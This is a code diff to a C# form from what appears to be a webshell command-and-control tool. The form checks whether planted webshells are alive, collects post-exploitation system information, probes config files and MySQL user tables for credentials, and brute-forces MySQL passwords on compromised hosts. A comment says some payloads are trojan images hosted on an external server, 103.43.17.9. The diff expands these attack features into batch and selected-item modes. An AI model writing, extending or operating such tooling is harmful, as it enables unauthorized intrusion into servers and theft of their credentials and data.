@@ -2,6 +2,7 @@
 using C2.Core;
 using C2.Utils;
 using System;
+using System.Collections;
 using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
@@ -79,8 +80,6 @@ namespace C2.Business.CastleBravo.WebShellTool
                 this.trojanMenu,
                 this.infoCollectionMenu,
                 this.passwdBlastingMenuItem,
-                this.allTaskMysqlMenuItem,
-                this.aliveTaskMysqlMenuItem
             };
         }
         private void InitializeLock()
@@ -346,12 +345,19 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         private void CheckAliveSelectedItemMenuItem_Click(object sender, EventArgs e)
         {
-            this.checkAliveNeedStop = false;
+            this.actionNeedStop = false;
             if (this.LV.SelectedItems.Count == 0)
                 return;
-            UpdateAliveItems(LV.SelectedItems[0]);
+            ResetProgressMenuValue(LV.SelectedItems.Count);
+
+            DoCheckAliveItems(LV.SelectedItems, false, false);
             RefreshTasks();
             SaveDB();
+        }
+
+        private void CheckAliveAll(bool skipAlive, bool safeMode)
+        {
+            DoCheckAliveItems(LV.Items, skipAlive, safeMode);
         }
 
         private void CheckAliveAllMenuItem_Click(object sender, EventArgs e)
@@ -359,11 +365,11 @@ namespace C2.Business.CastleBravo.WebShellTool
             DoCheckAliveAllMenuItemClick(false);
         }
 
-        private bool checkAliveNeedStop = false;
+        private bool actionNeedStop = false;
 
         private void CheckAliveStopMenu_Click(object sender, EventArgs e)
         {
-            checkAliveNeedStop = true;
+            actionNeedStop = true;
         }
 
         private void SecondCheckAliveTaskStatus()
@@ -403,41 +409,44 @@ namespace C2.Business.CastleBravo.WebShellTool
             EndCheckAlive();
         }
 
-        private void CheckAliveAll(bool skipAlive, bool safeMode)
+
+
+        private void DoCheckAliveItems(IList items, bool skipAlive, bool safeMode)
         {
             s = DateTime.Now;
             using (new ControlEnableGuarder(this.contextMenuStrip))
             using (new ToolStripItemEnableGuarder(this.enableItems))
-            foreach (ListViewItem lvi in LV.Items)
-            {
-                if (checkAliveNeedStop)
-                    break;
-                // 启用二刷
-                if (skipAlive && lvi.SubItems[5].Text != "待")
-                    continue;
-                UpdateAliveItems(lvi, safeMode);
-                UpdateProgress();
-                CheckSavePoint(); // 5分钟保存一次
-            }
+            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
+                foreach (ListViewItem lvi in items)
+                {
+                    if (actionNeedStop)
+                        break;
+                    // 启用二刷
+                    if (skipAlive && lvi.SubItems[5].Text != "待")
+                        continue;
+                    UpdateAliveItems(lvi, safeMode);
+                    UpdateProgress();
+                    CheckSavePoint(); // 5分钟保存一次
+                }
             InitializeLock();//验活不影响功能加锁
-
         }
         private void CheckAliveContinue(bool safeMode)
         {
             s = DateTime.Now;
             using (new ControlEnableGuarder(this.contextMenuStrip))
             using (new ToolStripItemEnableGuarder(this.enableItems))
-            foreach (ListViewItem lvi in LV.Items)
-            {
-                if (checkAliveNeedStop)
-                    break;
-                // 对留存的空状态验活
-                if (!lvi.SubItems[5].Text.Trim().IsNullOrEmpty())
-                    continue;
-                UpdateAliveItems(lvi, safeMode);
-                UpdateProgress();
-                CheckSavePoint(); // 5分钟保存一次
-            }
+            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
+                foreach (ListViewItem lvi in LV.Items)
+                {
+                    if (actionNeedStop)
+                        break;
+                    // 对留存的空状态验活
+                    if (!lvi.SubItems[5].Text.Trim().IsNullOrEmpty())
+                        continue;
+                    UpdateAliveItems(lvi, safeMode);
+                    UpdateProgress();
+                    CheckSavePoint(); // 5分钟保存一次
+                }
             InitializeLock();//验活不影响功能加锁
         }
 
@@ -463,7 +472,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             this.progressMenu.Text = string.Empty;
             this.progressBar.Value = 0;
             this.progressBar.Maximum = progressMaxValue;
-            this.checkAliveNeedStop = false;
+            this.actionNeedStop = false;
             this.NumberOfAlive = 0;
             this.setOfIPAddress.Clear();
             this.setOfHost.Clear();
@@ -668,7 +677,7 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         private void WebShellManageForm_FormClosing(object sender, FormClosingEventArgs e)
         {
-            this.checkAliveNeedStop = true;
+            this.actionNeedStop = true;
             using (GuarderUtil.WaitCursor)
             {
                 RefreshTasks();
@@ -703,22 +712,6 @@ namespace C2.Business.CastleBravo.WebShellTool
         }
 
         #region 后信息收集模块,该模块部分payload是存储在境外服务器103.43.17.9上的图片马
-        // mysql部分
-        private void AllTaskMysqlMenuItem_Click(object sender, EventArgs e)
-        {
-            this.sgType = SGType.MysqlBlasting;
-            BatchInfoColletion(false);
-        }
-        private void AliveTaskMysqlMenuItem_Click(object sender, EventArgs e)
-        {
-            this.sgType = SGType.MysqlBlasting;
-            BatchInfoColletion(true);
-        }
- 
-        private void MysqlTaskSetMenuItem_Click(object sender, EventArgs e)
-        {
-            new MysqlBlastingSet().ShowDialog();
-        }
         //系统信息
         private void AllSysInfoMenuItem_Click(object sender, EventArgs e)
         {
@@ -744,11 +737,6 @@ namespace C2.Business.CastleBravo.WebShellTool
             BatchInfoColletion(true);
         }
 
-        private void CurrentProcessView_Click(object sender, EventArgs e)
-        {
-
-
-        }
         // 定时任务
         private void AllScheduleTask_Click(object sender, EventArgs e)
         {
@@ -777,43 +765,58 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         private void DoCurrentItemTask()
         {
-            this.checkAliveNeedStop = false;
-            foreach (ListViewItem item in this.LV.SelectedItems)
-            {
-                if (checkAliveNeedStop)
-                    break;
-                SingleInfoCollection(item);
-            }
+            
+            this.actionNeedStop = false;
+            ResetProgressMenuValue(LV.SelectedItems.Count);
+            using (new ControlEnableGuarder(this.contextMenuStrip))
+            using (new ToolStripItemEnableGuarder(this.enableItems))
+            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
+                foreach (ListViewItem item in LV.SelectedItems)
+                {
+                    if (actionNeedStop)
+                        break;
+                    SingleInfoCollection(item);
+                    UpdateProgress();
+                }
         }
 
         //公共函数部分
-        private void BatchInfoColletion(bool checkAlive)
+        private void BatchInfoColletion(bool checkAlive,int time = 60)
         {   // 刷新前先强制清空
             ResetProgressMenuValue(checkAlive ? CountStatusAliveItem() : LV.Items.Count);
             ClearScanResult();
-            DoInfoCollectionTask(checkAlive);
+            DoInfoCollectionTask(LV.Items, checkAlive, time);
             EndCheckAlive();
         }
-        private void DoInfoCollectionTask(bool checkAlive)
+
+        private void SelectedInfoColletion(int time = 60)
+        {
+            ResetProgressMenuValue(LV.SelectedItems.Count);
+            ClearScanResult();
+            DoInfoCollectionTask(LV.SelectedItems, false, time);
+            EndCheckAlive();
+        }
+        private void DoInfoCollectionTask(IList items, bool checkAlive, int time)
         {
             s = DateTime.Now;
             using (new ControlEnableGuarder(this.contextMenuStrip))
             using (new ToolStripItemEnableGuarder(this.enableItems))
-                foreach (ListViewItem lvi in LV.Items)
+            using (new ToolStripItemTextGuarder(this.actionStatusLabel, "进行中", "已完成"))
+                foreach (ListViewItem lvi in items)
                 {
-                    if (checkAliveNeedStop)
+                    if (actionNeedStop)
                         break;
                     if (checkAlive && !lvi.SubItems[5].Text.Equals("√"))
                     {
                         lvi.SubItems[7].Text = "跳";
                         continue;
                     }
-                    SingleInfoCollection(lvi);
+                    SingleInfoCollection(lvi, time);
                     UpdateProgress();
                     CheckSavePoint(); // 5分钟保存一次
                 }
         }
-        private void SingleInfoCollection(ListViewItem lvi,int time = 90)
+        private void SingleInfoCollection(ListViewItem lvi, int time = 60)
         {
             WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
             lvi.SubItems[7].Text = "进行中";
@@ -828,12 +831,12 @@ namespace C2.Business.CastleBravo.WebShellTool
                 string payload = string.Format(ClientSetting.PayloadDict[this.sgType], task.Password);
                 if (this.sgType == SGType.UserTable)
                 {
-                    byte[] ret = WebClientEx.PostDownload(NetUtil.FormatUrl(task.Url), payload, 80000, Proxy);
+                    byte[] ret = WebClientEx.PostDownload(NetUtil.FormatUrl(task.Url), payload, 30000, Proxy);
                     task.ProbeInfo = ClientSetting.ProcessingResults(ret, task.Url, ClientSetting.InfoProbeItems[this.sgType]);
                 }
                 else
                 {
-                    string ret = WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 80000, Proxy);
+                    string ret = WebClientEx.Post(NetUtil.FormatUrl(task.Url), payload, 30000, Proxy);
                     task.ProbeInfo = ProcessingResults(ret, task.Url);
                 }
 
@@ -867,7 +870,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             Regex r = new Regex("formatted_address\":\"(.+),\"business");
             int index = new Random().Next(0, ClientSetting.BDLocationAK.Count - 1);
             string bdURL = string.Format(ClientSetting.BDLocationAPI, ClientSetting.BDLocationAK[index], rawResult);
-            string jsonResult = ST.EncodeUTF8(WebClientEx.Post(bdURL, string.Empty, 10000, Proxy));
+            string jsonResult = ST.EncodeUTF8(WebClientEx.Post(bdURL, string.Empty, 8000, Proxy));
             Match m = r.Match(jsonResult);
             return m.Success ? rawResult + ":" + m.Groups[1].Value : string.Empty;
         }
@@ -985,22 +988,21 @@ namespace C2.Business.CastleBravo.WebShellTool
             DoCurrentItemTask();
         }
 
-        private void MysqlBlastingToolStripMenuItem_Click(object sender, EventArgs e)
-        {
-            this.sgType = SGType.MysqlBlasting;
-            DoCurrentItemTask();
-        }
-
         private void 配置文件探针ToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (this.LV.SelectedItems.Count == 0)
                 return;
-
+            int timeout = ConfigPayloadOk();
+            if (timeout == 0) 
+                return;
+            SelectedInfoColletion(timeout);
+        }
+        private int ConfigPayloadOk()
+        {
             MysqlProbeSet mps = new MysqlProbeSet();
             if (mps.ShowDialog() != DialogResult.OK)
-                return;
+                return 0;
 
-            int ts = mps.TimeoutSeconds;
             int ps = mps.ProbeStrategy;
             string files = mps.SearchFiles.Trim();
             string fields = mps.SearchFields.Trim();
@@ -1013,24 +1015,29 @@ namespace C2.Business.CastleBravo.WebShellTool
                 ST.EncodeBase64(fields));
 
             ClientSetting.PayloadDict[SGType.MysqlProbe] = payload;
-            SingleInfoCollection(this.LV.SelectedItems[0], ts);
+            return mps.TimeoutSeconds;
         }
-
         private void UserMYD探针ToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (this.LV.SelectedItems.Count == 0)
                 return;
-            this.sgType = SGType.UserTable;
+            if (!UserMYDPayloadOK())
+                return;
+            SelectedInfoColletion();
+        }
+        private bool UserMYDPayloadOK()
+        {
+            bool buildOK = true;             
             UserMYDProbeSet utp = new UserMYDProbeSet();
             if (utp.ShowDialog() != DialogResult.OK)
-                return;
+                return !buildOK;
+            this.sgType = SGType.UserTable;
             string payload = string.Format(ClientSetting.UserTablePayload,
                                          "{0}", utp.DBUser, utp.DBPassword);
 
             ClientSetting.PayloadDict[SGType.UserTable] = payload;
-            SingleInfoCollection(this.LV.SelectedItems[0]);
+            return buildOK;
         }
-
         private void 全部验活_继续上次ToolStripMenuItem_Click(object sender, EventArgs e)
         {
             DoCheckAliveContinue(false);
@@ -1039,6 +1046,78 @@ namespace C2.Business.CastleBravo.WebShellTool
         private void 境外验活_继续上次ToolStripMenuItem_Click(object sender, EventArgs e)
         {
             DoCheckAliveContinue(true);
+        }
+
+        private void MB_所有项ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            this.sgType = SGType.MysqlBlasting;
+            BatchInfoColletion(false);
+        }
+
+        private void MB_验活项ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            this.sgType = SGType.MysqlBlasting;
+            BatchInfoColletion(true);
+        }
+
+        private void MB_选定项ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            this.sgType = SGType.MysqlBlasting;
+            DoCurrentItemTask();
+        }
+
+        private void 配置文件探针_所有项ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            int timeout = ConfigPayloadOk();
+            if (timeout == 0)
+                return;
+            BatchInfoColletion(false, timeout);
+        }
+
+        private void 配置文件探针_验活项ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            int timeout = ConfigPayloadOk();
+            if (timeout == 0)
+                return;
+            BatchInfoColletion(true, timeout);
+        }
+
+        private void 配置文件探针_选定项ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (this.LV.SelectedItems.Count == 0)
+                return;
+            int timeout = ConfigPayloadOk();
+            if (timeout == 0)
+                return;
+            SelectedInfoColletion(timeout);
+        }
+
+        private void UserMYD探针_所有项ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (!UserMYDPayloadOK())
+                return;
+            BatchInfoColletion(false);
+        }
+
+        private void UserMYD探针_验活项ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (!UserMYDPayloadOK())
+                return;
+            BatchInfoColletion(true);
+        }
+
+        private void UserMYD探针_选定项ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (this.LV.SelectedItems.Count == 0)
+                return;
+            if (!UserMYDPayloadOK())
+                return;
+            SelectedInfoColletion();
+        }
+
+        private void MB_设置ToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            new MysqlBlastingSet().ShowDialog();
         }
     }
 }
